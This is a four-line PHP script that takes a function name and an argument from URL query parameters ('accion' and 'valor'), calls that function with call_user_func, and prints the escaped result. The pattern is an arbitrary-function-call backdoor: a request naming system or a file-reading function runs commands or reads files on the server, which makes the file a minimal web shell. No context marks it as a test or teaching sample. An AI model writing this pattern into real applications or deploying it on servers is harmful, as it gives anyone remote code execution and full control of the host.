<?php
$accion = $_GET["accion"];
$resultado = call_user_func($accion, $_GET["valor"]);
echo htmlspecialchars((string) $resultado);
